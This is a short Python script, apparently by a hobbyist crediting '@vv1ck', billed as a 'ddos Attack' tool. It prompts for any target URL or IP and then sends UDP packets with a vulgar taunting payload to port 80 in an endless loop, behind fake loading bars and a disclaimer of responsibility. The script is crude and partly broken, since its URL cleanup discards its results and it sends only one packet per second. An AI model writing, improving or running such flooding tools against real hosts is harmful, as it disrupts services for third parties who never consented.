import socket
import os
import time
Fore = 'solo'
dev = '' \
      'RIGHTS:'
'dev not filza'
'dev not filza'
'dev is -->:@vv1ck'








print("""
RIGHTS:
dev not filza
dev not filza 
dev is -->:@vv1ck



""")
print('''


[1]  ddos Attack 🚀
[2] report insta in another file

''')

print("==========================================")
print( Fore +""" ddos Attack 🚀
Caution, I am not responsible for any wrong use of the tool
""")
print("==========================================")
target = input("Enter Target url or Ip : ")
target.replace("http://", "")
target.replace("https://","")
target.replace("www.","")
ip = socket.gethostbyname(target)
port = 80
vv1ck = "filza_is_coming_filza_is_comin_filza_is_coming_filza_is_fucking_filza_is_fucking_"
print(Fore +"Loading{>>> }5%")
time.sleep(2)
print("Loading{>>>>> }10%")
time.sleep(2)
print(Fore +"Loading{>>>>>>> }40%")
time.sleep(2)
print(Fore +"Loading{>>>>>>>>>> }90%")
time.sleep(2)
print(Fore +"Loading{>>>>>>>>>>>>>>}100%")
os.system("figlet Attack_Starting")
while True:
   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   sock.sendto(bytes(vv1ck,"UTF-8"), (ip,port))
   time.sleep(1)
   print(port, "<===send packet to ===>",ip)
